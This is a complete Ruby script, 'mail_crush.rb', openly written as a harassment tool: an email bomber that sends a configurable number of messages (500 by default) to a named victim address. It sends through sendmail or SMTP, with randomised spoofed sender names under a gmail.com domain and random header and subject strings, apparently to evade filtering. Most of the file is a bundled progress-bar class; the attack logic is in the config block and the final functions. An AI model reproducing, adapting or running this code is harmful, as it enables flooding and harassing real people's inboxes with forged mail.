# DO IT FOR THE LULZ!
#
# How to use.
# 1. Set the configuration
# 2. ruby mail_crush.rb
# 3. Wait
# 4. ???
# 5. Profit!

#ready

CONFIG = 
{
  :victim => 'helplessVictim@hotmail.com', # pretty sure you know what to put here
  :from => 'gmail.com', # Just the domain, username is randomly generated
  :subject => 'LOL I TROLL YOU', # subject + Random
  :text => 'Top Kek',
  :crushing => 500, # Number of mails to send
  
  # SMTP/SENDMAIL configuration
  :method => :sendmail, # :sendmail or :smtp
  # Sendmail conf:
  :sendmail => 
  {
    :location => "/usr/sbin/sendmail",
    :args => "-i -t"
  },

  # Smtp conf:
  :smtp => 
  {
    :authentication=> nil,
    :password => nil,
    :domain => "ohHai.tld",
    :port => 25,
    :user_name => nil,
    :address => "localhost"
  }
}

# Ruby/Progress Bar http://0xcc.net/ruby-progressbar/index.html.en
class ProgressBar
  VERSION = "0.9"

  def initialize (title, total, out = STDERR)
    @title = title
    @total = total
    @out = out
    @terminal_width = 80
    @bar_mark = "o"
    @current = 0
    @previous = 0
    @finished_p = false
    @start_time = Time.now
    @previous_time = @start_time
    @title_width = 14
    @format = "%-#{@title_width}s %3d%% %s %s"
    @format_arguments = [:title, :percentage, :bar, :stat]
    clear
    show
  end

  attr_reader   :title
  attr_reader   :current
  attr_reader   :total
  attr_accessor :start_time

  private
  def fmt_bar
    bar_width = do_percentage * @terminal_width / 100
    sprintf("|%s%s|", 
            @bar_mark * bar_width, 
            " " *  (@terminal_width - bar_width))
  end


  def fmt_percentage
    do_percentage
  end

  def fmt_stat
    if @finished_p then elapsed else eta end
  end

  def fmt_stat_for_file_transfer
    if @finished_p then 
      sprintf("%s %s %s", bytes, transfer_rate, elapsed)
    else 
      sprintf("%s %s %s", bytes, transfer_rate, eta)
    end
  end

  def fmt_title
    @title[0,(@title_width - 1)] + ":"
  end

  def convert_bytes (bytes)
    if bytes < 1024
      sprintf("%6dB", bytes)
    elsif bytes < 1024 * 1000 # 1000kb
      sprintf("%5.1fKB", bytes.to_f / 1024)
    elsif bytes < 1024 * 1024 * 1000  # 1000mb
      sprintf("%5.1fMB", bytes.to_f / 1024 / 1024)
    else
      sprintf("%5.1fGB", bytes.to_f / 1024 / 1024 / 1024)
    end
  end

  def transfer_rate
    bytes_per_second = @current.to_f / (Time.now - @start_time)
    sprintf("%s/s", convert_bytes(bytes_per_second))
  end

  def bytes
    convert_bytes(@current)
  end

  def format_time (t)
    t = t.to_i
    sec = t % 60
    min  = (t / 60) % 60
    hour = t / 3600
    sprintf("%02d:%02d:%02d", hour, min, sec);
  end

  # ETA stands for Estimated Time of Arrival.
  def eta
    if @current == 0
      "ETA:  --:--:--"
    else
      elapsed = Time.now - @start_time
      eta = elapsed * @total / @current - elapsed;
      sprintf("ETA:  %s", format_time(eta))
    end
  end

  def elapsed
    elapsed = Time.now - @start_time
    sprintf("Time: %s", format_time(elapsed))
  end
  
  def eol
    if @finished_p then "\n" else "\r" end
  end

  def do_percentage
    if @total.zero?
      100
    else
      @current  * 100 / @total
    end
  end

  def get_width
    # FIXME: I don't know how portable it is.
    default_width = 80
    begin
      tiocgwinsz = 0x5413
      data = [0, 0, 0, 0].pack("SSSS")
      if @out.ioctl(tiocgwinsz, data) >= 0 then
        rows, cols, xpixels, ypixels = data.unpack("SSSS")
        if cols >= 0 then cols else default_width end
      else
        default_width
      end
    rescue Exception
      default_width
    end
  end

  def show
    arguments = @format_arguments.map {|method| 
      method = sprintf("fmt_%s", method)
      send(method)
    }
    line = sprintf(@format, *arguments)

    width = get_width
    if line.length == width - 1 
      @out.print(line + eol)
      @out.flush
    elsif line.length >= width
      @terminal_width = [@terminal_width - (line.length - width + 1), 0].max
      if @terminal_width == 0 then @out.print(line + eol) else show end
    else # line.length < width - 1
      @terminal_width += width - line.length + 1
      show
    end
    @previous_time = Time.now
  end

  def show_if_needed
    if @total.zero?
      cur_percentage = 100
      prev_percentage = 0
    else
      cur_percentage  = (@current  * 100 / @total).to_i
      prev_percentage = (@previous * 100 / @total).to_i
    end

    # Use "!=" instead of ">" to support negative changes
    if cur_percentage != prev_percentage || 
        Time.now - @previous_time >= 1 || @finished_p
      show
    end
  end

  public
  def clear
    @out.print "\r"
    @out.print(" " * (get_width - 1))
    @out.print "\r"
  end

  def finish
    @current = @total
    @finished_p = true
    show
  end

  def finished?
    @finished_p
  end

  def file_transfer_mode
    @format_arguments = [:title, :percentage, :bar, :stat_for_file_transfer]
  end

  def format= (format)
    @format = format
  end

  def format_arguments= (arguments)
    @format_arguments = arguments
  end

  def halt
    @finished_p = true
    show
  end

  def inc (step = 1)
    @current += step
    @current = @total if @current > @total
    show_if_needed
    @previous = @current
  end

  def set (count)
    if count < 0 || count > @total
      raise "invalid count: #{count} (total: #{@total})"
    end
    @current = count
    show_if_needed
    @previous = @current
  end

  def inspect
    "#<ProgressBar:#{@current}/#{@total}>"
  end
end

class ReversedProgressBar < ProgressBar
  def do_percentage
    100 - super
  end
end


# the code now!

def random(length=10)
  # Random string generator
  chars = ("a".."z").to_a + ("A".."Z").to_a + ("0".."9").to_a
  newstr = ""
  1.upto(length) { |i| newstr << chars[rand(chars.size-1)] }
  return newstr
end 

def sendmail_delivery(mail)
  # To send with Sendmail
  IO.popen("#{CONFIG[:sendmail][:location]} #{CONFIG[:sendmail][:args]}","w+") do |sm|
    sm.print(mail)
    sm.flush
  end
end

def smtp_delivery(mail)
  # To send with SMTP
  Net::SMTP.start(CONFIG[:smtp][:address], CONFIG[:smtp][:port], CONFIG[:smtp][:domain], 
      CONFIG[:smtp][:user_name], CONFIG[:smtp][:password], CONFIG[:smtp][:authentication]) do |smtp|
    smtp.sendmail(mail)
  end
end

def crush!
  # crush teh victim
  mail = ""
  mail << "To: " + CONFIG[:victim] + "\n"
  mail << "From: " + random(10) + '@' + CONFIG[:from] + "\n"
  mail << "X-Mailer: " + random(30) + "\n"
  mail << "Subject: " + random(10) + ' ' + CONFIG[:subject] + ' ' + random(20) + "\n"
  mail << "\n" + CONFIG[:text]
  __send__("#{CONFIG[:method]}_delivery", mail)
  @pbar.inc
end

puts ":-) crushing #{CONFIG[:victim]}, with #{CONFIG[:crushing]} mails."

@pbar = ProgressBar.new("Mails", CONFIG[:crushing])
CONFIG[:crushing].times { crush! }
puts "\n"